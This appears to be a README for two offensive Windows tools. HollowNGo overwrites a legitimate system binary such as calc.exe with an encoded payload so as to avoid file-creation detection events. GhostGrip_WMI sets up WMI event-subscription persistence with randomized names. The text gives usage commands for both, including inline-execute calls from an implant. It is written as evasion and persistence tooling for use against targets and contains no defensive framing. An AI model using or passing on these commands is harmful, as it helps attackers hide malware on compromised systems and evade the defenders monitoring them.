HollowNGo aims to avoid FileCreation Events by reading your payload as bytes, compressing them, and converting the compressed bytes to base64, setting the target file stream length to 0, then the same encoding operation in reverse to write to the target file. THIS IS TO BE RUN ON YOUR MACHINE NOT THE TARGET.

HollowNGo.exe -encode <source.exe> -output <output.txt>
example: HollowNGo.exe C:\Users\User\Documents\MyEvil.Exe -output EvilB64.txt

HollowNGo.exe -source <base64_content> -target <target.exe>
Example: dotnet inline-execute HollowNGo.exe -source <EvilB64.Code> -target C:\Windows\System32\calc.exe


GhostGrip_WMI creates a WMIEventSubscription for your prefered event for persistence. Use HollowNGo prior to set up your executable to avoid FileCreation Events.

GhostGrip_WMI.exe -location <path_to_executable> -type <time/logon/eventcode> -randomizename true/false
example dotnet inline-exeucte GhostGrip_WMI.exe -location C:\Windows\System32\calc.exe -type eventcode -eventcode 4726 -randomizename true
